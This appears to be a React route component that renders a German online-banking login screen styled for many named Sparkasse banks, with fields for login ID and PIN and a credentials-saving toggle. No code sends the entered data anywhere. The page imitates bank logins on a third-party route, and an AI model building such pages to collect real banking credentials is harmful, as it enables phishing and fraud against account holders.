import { useState } from "react";
import { createFileRoute, Link, useParams } from "@tanstack/react-router";
import { ArrowLeft, Info, X } from "lucide-react";
import { bankLogoUrls } from "@/assets/bank-logos";

const sparkassen: string[] = [
  "Berliner Sparkasse - Landesbank Berlin",
  "Hamburger Sparkasse",
  "Sparkasse KölnBonn",
  "Kreissparkasse Köln",
  "Sparkasse Hannover",
  "Mittelbrandenburgische Sparkasse in Potsdam",
  "Sparkasse Leipzig",
  "Sparkasse Dortmund",
  "Landessparkasse zu Oldenburg",
  "Sparkasse Duisburg",
  "Stadtsparkasse München",
  "Sparkasse Bremen",
  "Sparkasse Essen",
  "Sparkasse Aachen",
  "Sparkasse Vest Recklinghausen",
  "Ostsächsische Sparkasse Dresden",
  "Frankfurter Sparkasse",
  "Sparkasse Nürnberg",
  "Ostseesparkasse Rostock",
  "Saalesparkasse",
  "Nassauische Sparkasse",
  "Sparkasse Mittelthüringen",
  "Sparkasse Krefeld",
  "Stadt-Sparkasse Düsseldorf",
  "Sparkasse Paderborn-Detmold-Höxter",
  "Sparkasse Hildesheim Goslar Peine",
  "Förde Sparkasse",
  "Sparkasse Bochum",
  "Stadtsparkasse Wuppertal",
  "Sparkasse Neuss",
  "Stadtsparkasse Münsterland Ost",
  "Nord-Ostsee Sparkasse",
  "Sparkasse Westmünsterland",
  "Stadtsparkasse Augsburg",
  "Sparkasse am Niederrhein",
  "Weser-Elbe Sparkasse",
  "NORD/LB - Norddeutsche Landesbank",
  "Sparkasse Holstein",
  "Sparkasse Schwaben-Bodensee",
  "Sparkasse an Volme und Ruhr",
  "Stadtsparkasse Gelsenkirchen",
  "Sparkasse Celle-Gifhorn-Wolfsburg",
  "Sparkasse Osnabrück",
  "Stadtsparkasse Mönchengladbach",
  "Sparkasse Pforzheim Calw",
];

export function slugifySparkasse(name: string): string {
  return name
    .toLowerCase()
    .replace(/ä/g, "ae")
    .replace(/ö/g, "oe")
    .replace(/ü/g, "ue")
    .replace(/ß/g, "ss")
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
}

const bySlug: Record<string, string> = Object.fromEntries(
  sparkassen.map((n) => [slugifySparkasse(n), n]),
);

export const Route = createFileRoute("/bank/sparkassen/$slug")({
  head: ({ params }) => {
    const name = bySlug[params.slug] ?? "Sparkasse";
    return {
      meta: [
        { title: `${name} — Login` },
        { name: "description", content: `Melde dich bei ${name} mit deinen Onlinebanking-Daten an.` },
        { property: "og:title", content: `${name} — Login` },
        { property: "og:description", content: `Melde dich bei ${name} mit deinen Onlinebanking-Daten an.` },
        { property: "og:type", content: "website" },
        { name: "twitter:card", content: "summary" },
      ],
    };
  },
  component: SparkassenLoginPage,
});

function SparkassenLoginPage() {
  const { slug } = useParams({ from: "/bank/sparkassen/$slug" });
  const name = bySlug[slug] ?? "Sparkasse";
  const logo = bankLogoUrls["sparkassen"];

  const [login, setLogin] = useState("");
  const [pin, setPin] = useState("");
  const [remember, setRemember] = useState(true);

  const canContinue = login.trim().length > 0 && pin.trim().length > 0;

  return (
    <div className="min-h-screen bg-neutral-100 p-4">
      <div className="mx-auto flex w-[600px] max-w-full items-start justify-center">
        <div className="flex h-[calc(100vh-2rem)] max-h-[1043px] w-full flex-col overflow-hidden rounded-2xl bg-white shadow-xl">
          <div className="flex flex-1 flex-col overflow-y-auto px-8 pb-6 pt-8 sm:px-10">
            <div className="flex items-start justify-between">
              <Link
                to="/bank/sparkassen"
                aria-label="Zurück"
                className="flex h-10 w-10 items-center justify-center rounded-full text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <ArrowLeft className="h-5 w-5" strokeWidth={2} />
              </Link>
              <Link
                to="/confirm"
                aria-label="Schließen"
                className="rounded-full p-1 text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <X className="h-6 w-6" strokeWidth={2} />
              </Link>
            </div>

            <img
              src={logo}
              alt=""
              className="mt-4 h-14 w-14 rounded-full object-contain"
            />

            <h1 className="mt-4 text-[24px] font-bold leading-tight text-[#0b051d]">{name}</h1>
            <p className="mt-1 text-[15px] text-[#373544]">Melde dich mit deinen Onlinebanking-Daten an</p>

            <div className="mt-6 rounded-2xl border border-neutral-300 focus-within:border-[#0b051d] focus-within:ring-1 focus-within:ring-[#0b051d]">
              <div className="px-4 py-3">
                <label htmlFor="sk-login" className="sr-only">Anmeldename oder Legitimations-ID</label>
                <input
                  id="sk-login"
                  type="text"
                  value={login}
                  onChange={(e) => setLogin(e.target.value)}
                  placeholder="Anmeldename oder Legitimations-ID"
                  className="h-8 w-full bg-transparent text-[15px] text-[#0b051d] outline-none placeholder:text-[#6b6b6b]"
                />
              </div>
              <div className="border-t border-neutral-300" />
              <div className="flex items-center gap-2 px-4 py-3">
                <label htmlFor="sk-pin" className="sr-only">PIN</label>
                <input
                  id="sk-pin"
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="PIN"
                  className="h-8 flex-1 bg-transparent text-[15px] text-[#0b051d] outline-none placeholder:text-[#6b6b6b]"
                />
                <Info className="h-5 w-5 shrink-0 text-[#6b6b6b]" strokeWidth={2} />
              </div>
            </div>

            <div className="mt-5 flex items-center justify-between">
              <span className="text-[15px] font-semibold text-[#0b051d]">Anmeldedaten speichern</span>
              <button
                type="button"
                role="switch"
                aria-checked={remember}
                onClick={() => setRemember((v) => !v)}
                className={`relative inline-flex h-7 w-12 items-center rounded-full transition-colors ${
                  remember ? "bg-[#0b051d]" : "bg-neutral-300"
                }`}
              >
                <span
                  className={`inline-block h-5 w-5 transform rounded-full bg-white transition-transform ${
                    remember ? "translate-x-6" : "translate-x-1"
                  }`}
                />
              </button>
            </div>
          </div>

          <div className="relative bg-white px-8 pb-6 pt-3 sm:px-10">
            <button
              type="button"
              disabled={!canContinue}
              className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                canContinue
                  ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
                  : "cursor-not-allowed bg-neutral-200 text-neutral-500"
              }`}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
